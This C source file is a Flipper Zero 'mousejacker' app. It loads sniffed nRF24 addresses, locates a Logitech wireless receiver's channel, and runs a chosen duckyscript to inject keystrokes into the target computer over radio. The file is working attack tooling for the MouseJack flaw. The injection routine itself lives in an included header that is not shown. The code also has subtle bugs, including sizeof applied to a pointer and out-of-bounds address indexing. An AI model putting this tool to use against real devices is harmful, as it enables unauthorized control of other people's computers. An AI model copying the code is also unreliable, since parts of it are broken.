#include <furi.h>
#include <gui/gui.h>
#include <dialogs/dialogs.h>
#include <input/input.h>
#include <stdlib.h>
#include <furi_hal.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <furi_hal_interrupt.h>
#include <furi_hal_resources.h>
#include <nrf24.h>
#include "mousejacker_ducky.h"

#define TAG "mousejacker"
#define LOGITECH_MAX_CHANNEL 85
#define NRFSNIFF_APP_PATH_FOLDER "/ext/nrfsniff"
#define NRFSNIFF_APP_PATH_EXTENSION ".txt"
#define NRFSNIFF_APP_FILENAME "addresses.txt"
#define MOUSEJACKER_APP_PATH_FOLDER "/ext/mousejacker"
#define MOUSEJACKER_APP_PATH_EXTENSION ".txt"
#define MAX_ADDRS 100

typedef enum {
    EventTypeTick,
    EventTypeKey,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} PluginEvent;

uint8_t addrs_count = 0;
uint8_t addr_idx = 0;
uint8_t loaded_addrs[MAX_ADDRS][6]; // first byte is rate, the rest are the address

char target_fmt_text[] = "Target addr: %s";
char target_address_str[12] = "None";
char target_text[30];

static void render_callback(Canvas* const canvas, void* ctx) {
    const PluginState* plugin_state = acquire_mutex((ValueMutex*)ctx, 25);
    if(plugin_state == NULL) {
        return;
    }
    // border around the edge of the screen
    canvas_draw_frame(canvas, 0, 0, 128, 64);

    canvas_set_font(canvas, FontSecondary);
    if(!plugin_state->addr_err && !plugin_state->ducky_err && !plugin_state->is_thread_running &&
       !plugin_state->is_ducky_running) {
        snprintf(target_text, sizeof(target_text), target_fmt_text, target_address_str);
        canvas_draw_str_aligned(canvas, 7, 10, AlignLeft, AlignBottom, target_text);
        canvas_draw_str_aligned(canvas, 22, 20, AlignLeft, AlignBottom, "<- select address ->");
        canvas_draw_str_aligned(canvas, 10, 30, AlignLeft, AlignBottom, "Press Ok button to ");
        canvas_draw_str_aligned(canvas, 10, 40, AlignLeft, AlignBottom, "browse for ducky script");
    } else if(plugin_state->addr_err) {
        canvas_draw_str_aligned(
            canvas, 10, 10, AlignLeft, AlignBottom, "Error: No nrfsniff folder");
        canvas_draw_str_aligned(canvas, 10, 20, AlignLeft, AlignBottom, "or addresses.txt file");
        canvas_draw_str_aligned(
            canvas, 10, 30, AlignLeft, AlignBottom, "loading error / empty file");
        canvas_draw_str_aligned(
            canvas, 7, 40, AlignLeft, AlignBottom, "Run (NRF24: Sniff) app first!");
    } else if(plugin_state->ducky_err) {
        canvas_draw_str_aligned(
            canvas, 3, 10, AlignLeft, AlignBottom, "Error: No mousejacker folder");
        canvas_draw_str_aligned(canvas, 3, 20, AlignLeft, AlignBottom, "or duckyscript file");
        canvas_draw_str_aligned(canvas, 3, 30, AlignLeft, AlignBottom, "loading error");
    } else if(plugin_state->is_thread_running && !plugin_state->is_ducky_running) {
        canvas_draw_str_aligned(canvas, 3, 10, AlignLeft, AlignBottom, "Loading...");
        canvas_draw_str_aligned(canvas, 3, 20, AlignLeft, AlignBottom, "Please wait!");
    } else if(plugin_state->is_thread_running && plugin_state->is_ducky_running) {
        canvas_draw_str_aligned(canvas, 3, 10, AlignLeft, AlignBottom, "Running duckyscript");
        canvas_draw_str_aligned(canvas, 3, 20, AlignLeft, AlignBottom, "Please wait!");
        canvas_draw_str_aligned(
            canvas, 3, 30, AlignLeft, AlignBottom, "Press back to exit (if it stuck)");
    } else {
        canvas_draw_str_aligned(canvas, 3, 10, AlignLeft, AlignBottom, "Unknown Error");
        canvas_draw_str_aligned(canvas, 3, 20, AlignLeft, AlignBottom, "press back");
        canvas_draw_str_aligned(canvas, 3, 30, AlignLeft, AlignBottom, "to exit");
    }

    release_mutex((ValueMutex*)ctx, plugin_state);
}

static void input_callback(InputEvent* input_event, FuriMessageQueue* event_queue) {
    furi_assert(event_queue);

    PluginEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(event_queue, &event, FuriWaitForever);
}

static void mousejacker_state_init(PluginState* const plugin_state) {
    plugin_state->is_thread_running = false;
}

static void hexlify(uint8_t* in, uint8_t size, char* out) {
    memset(out, 0, size * 2);
    for(int i = 0; i < size; i++)
        snprintf(out + strlen(out), sizeof(out + strlen(out)), "%02X", in[i]);
}

static bool open_ducky_script(Stream* stream, PluginState* plugin_state) {
    DialogsApp* dialogs = furi_record_open("dialogs");
    bool result = false;
    string_t path;
    string_init(path);
    string_set_str(path, MOUSEJACKER_APP_PATH_FOLDER);

    DialogsFileBrowserOptions browser_options;
    dialog_file_browser_set_basic_options(
        &browser_options, MOUSEJACKER_APP_PATH_EXTENSION, &I_badusb_10px);
    browser_options.hide_ext = false;

    bool ret = dialog_file_browser_show(dialogs, path, path, &browser_options);

    furi_record_close("dialogs");
    if(ret) {
        if(!file_stream_open(stream, string_get_cstr(path), FSAM_READ, FSOM_OPEN_EXISTING)) {
            FURI_LOG_D(TAG, "Cannot open file \"%s\"", (path));
        } else {
            result = true;
        }
    }
    string_clear(path);

    plugin_state->is_ducky_running = true;

    return result;
}

static bool open_addrs_file(Stream* stream) {
    DialogsApp* dialogs = furi_record_open("dialogs");
    bool result = false;
    string_t path;
    string_init(path);
    string_set_str(path, NRFSNIFF_APP_PATH_FOLDER);

    DialogsFileBrowserOptions browser_options;
    dialog_file_browser_set_basic_options(
        &browser_options, NRFSNIFF_APP_PATH_EXTENSION, &I_sub1_10px);
    browser_options.hide_ext = false;

    bool ret = dialog_file_browser_show(dialogs, path, path, &browser_options);

    furi_record_close("dialogs");
    if(ret) {
        if(!file_stream_open(stream, string_get_cstr(path), FSAM_READ, FSOM_OPEN_EXISTING)) {
            FURI_LOG_D(TAG, "Cannot open file \"%s\"", (path));
        } else {
            result = true;
        }
    }
    string_clear(path);
    return result;
}

static bool process_ducky_file(
    Stream* file_stream,
    uint8_t* addr,
    uint8_t addr_size,
    uint8_t rate,
    PluginState* plugin_state) {
    size_t file_size = 0;
    size_t bytes_read = 0;
    uint8_t* file_buf;
    bool loaded = false;
    FURI_LOG_D(TAG, "opening ducky script");
    if(open_ducky_script(file_stream, plugin_state)) {
        file_size = stream_size(file_stream);
        if(file_size == (size_t)0) {
            FURI_LOG_D(TAG, "load failed. file_size: %d", file_size);
            plugin_state->is_ducky_running = false;
            return loaded;
        }
        file_buf = malloc(file_size);
        memset(file_buf, 0, file_size);
        bytes_read = stream_read(file_stream, file_buf, file_size);
        if(bytes_read == file_size) {
            FURI_LOG_D(TAG, "executing ducky script");
            mj_process_ducky_script(
                nrf24_HANDLE, addr, addr_size, rate, (char*)file_buf, plugin_state);
            FURI_LOG_D(TAG, "finished execution");
            loaded = true;
        } else {
            FURI_LOG_D(TAG, "load failed. file size: %d", file_size);
        }
        free(file_buf);
    }
    plugin_state->is_ducky_running = false;
    return loaded;
}

static bool load_addrs_file(Stream* file_stream) {
    size_t file_size = 0;
    size_t bytes_read = 0;
    uint8_t* file_buf;
    char* line_ptr;
    uint8_t rate;
    uint8_t addrlen = 0;
    uint32_t counter = 0;
    uint8_t addr[5] = {0};
    uint32_t i_addr_lo = 0;
    uint32_t i_addr_hi = 0;
    bool loaded = false;
    FURI_LOG_D(TAG, "opening addrs file");
    addrs_count = 0;
    if(open_addrs_file(file_stream)) {
        file_size = stream_size(file_stream);
        if(file_size == (size_t)0) {
            FURI_LOG_D(TAG, "load failed. file_size: %d", file_size);
            return loaded;
        }
        file_buf = malloc(file_size);
        memset(file_buf, 0, file_size);
        bytes_read = stream_read(file_stream, file_buf, file_size);
        if(bytes_read == file_size) {
            FURI_LOG_D(TAG, "loading addrs file");
            char* line = strtok((char*)file_buf, "\n");

            while(line != NULL) {
                line_ptr = strstr((char*)line, ",");
                *line_ptr = 0;
                rate = atoi(line_ptr + 1);
                addrlen = (uint8_t)(strlen(line) / 2);
                i_addr_lo = strtoul(line + 2, NULL, 16);
                line[2] = (char)0;
                i_addr_hi = strtoul(line, NULL, 16);
                int32_to_bytes(i_addr_lo, &addr[1], true);
                addr[0] = (uint8_t)(i_addr_hi & 0xFF);
                memset(loaded_addrs[counter], rate, 1);
                memcpy(&loaded_addrs[counter++][1], addr, addrlen);
                addrs_count++;
                line = strtok(NULL, "\n");
                loaded = true;
            }
        } else {
            FURI_LOG_D(TAG, "load failed. file size: %d", file_size);
        }
        free(file_buf);
    }
    return loaded;
}

// entrypoint for worker
static int32_t mj_worker_thread(void* ctx) {
    PluginState* plugin_state = ctx;
    bool ducky_ok = false;
    if(!plugin_state->addr_err) {
        plugin_state->is_thread_running = true;
        plugin_state->file_stream = file_stream_alloc(plugin_state->storage);
        nrf24_find_channel(
            nrf24_HANDLE,
            loaded_addrs[addr_idx] + 1,
            loaded_addrs[addr_idx] + 1,
            5,
            loaded_addrs[addr_idx][0],
            2,
            LOGITECH_MAX_CHANNEL,
            true);
        ducky_ok = process_ducky_file(
            plugin_state->file_stream,
            loaded_addrs[addr_idx] + 1,
            5,
            loaded_addrs[addr_idx][0],
            plugin_state);
        if(!ducky_ok) {
            plugin_state->ducky_err = true;
        } else {
            plugin_state->ducky_err = false;
        }
        stream_free(plugin_state->file_stream);
    }
    plugin_state->is_thread_running = false;
    return 0;
}

void start_mjthread(PluginState* plugin_state) {
    if(!plugin_state->is_thread_running) {
        furi_thread_start(plugin_state->mjthread);
    }
}

int32_t mousejacker_app(void* p) {
    UNUSED(p);
    FuriMessageQueue* event_queue = furi_message_queue_alloc(8, sizeof(PluginEvent));

    PluginState* plugin_state = malloc(sizeof(PluginState));
    mousejacker_state_init(plugin_state);
    ValueMutex state_mutex;
    if(!init_mutex(&state_mutex, plugin_state, sizeof(PluginState))) {
        FURI_LOG_E("mousejacker", "cannot create mutex\r\n");
        furi_message_queue_free(event_queue);
        free(plugin_state);
        return 255;
    }

    // Set system callbacks
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, render_callback, &state_mutex);
    view_port_input_callback_set(view_port, input_callback, event_queue);

    // Open GUI and register view_port
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    plugin_state->storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(plugin_state->storage, MOUSEJACKER_APP_PATH_FOLDER);
    plugin_state->file_stream = file_stream_alloc(plugin_state->storage);

    plugin_state->mjthread = furi_thread_alloc();
    furi_thread_set_name(plugin_state->mjthread, "MJ Worker");
    furi_thread_set_stack_size(plugin_state->mjthread, 2048);
    furi_thread_set_context(plugin_state->mjthread, plugin_state);
    furi_thread_set_callback(plugin_state->mjthread, mj_worker_thread);

    // spawn load file dialog to choose sniffed addresses file
    if(load_addrs_file(plugin_state->file_stream)) {
        addr_idx = 0;
        hexlify(&loaded_addrs[addr_idx][1], 5, target_address_str);
        plugin_state->addr_err = false;
    } else {
        plugin_state->addr_err = true;
    }
    stream_free(plugin_state->file_stream);
    nrf24_init();

    PluginEvent event;
    for(bool processing = true; processing;) {
        FuriStatus event_status = furi_message_queue_get(event_queue, &event, 100);
        PluginState* plugin_state = (PluginState*)acquire_mutex_block(&state_mutex);

        if(event_status == FuriStatusOk) {
            // press events
            if(event.type == EventTypeKey) {
                if(event.input.type == InputTypePress) {
                    switch(event.input.key) {
                    case InputKeyUp:
                        break;
                    case InputKeyDown:
                        break;
                    case InputKeyRight:
                        if(!plugin_state->addr_err) {
                            addr_idx++;
                            if(addr_idx > addrs_count) addr_idx = 0;
                            hexlify(loaded_addrs[addr_idx] + 1, 5, target_address_str);
                        }
                        break;
                    case InputKeyLeft:
                        if(!plugin_state->addr_err) {
                            addr_idx--;
                            if(addr_idx == 0) addr_idx = addrs_count - 1;
                            hexlify(loaded_addrs[addr_idx] + 1, 5, target_address_str);
                        }
                        break;
                    case InputKeyOk:
                        if(!plugin_state->addr_err) {
                            if(!plugin_state->is_thread_running) {
                                start_mjthread(plugin_state);
                                view_port_update(view_port);
                            }
                        }
                        break;
                    case InputKeyBack:
                        plugin_state->close_thread_please = true;
                        if(plugin_state->is_thread_running && plugin_state->mjthread) {
                            furi_thread_join(
                                plugin_state->mjthread); // wait until thread is finished
                        }
                        plugin_state->close_thread_please = false;
                        processing = false;
                        break;
                    }
                }
            }
        }

        view_port_update(view_port);
        release_mutex(&state_mutex, plugin_state);
    }

    furi_thread_free(plugin_state->mjthread);
    furi_hal_spi_release(nrf24_HANDLE);
    view_port_enabled_set(view_port, false);
    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_STORAGE);
    view_port_free(view_port);
    furi_message_queue_free(event_queue);
    free(plugin_state);

    return 0;
}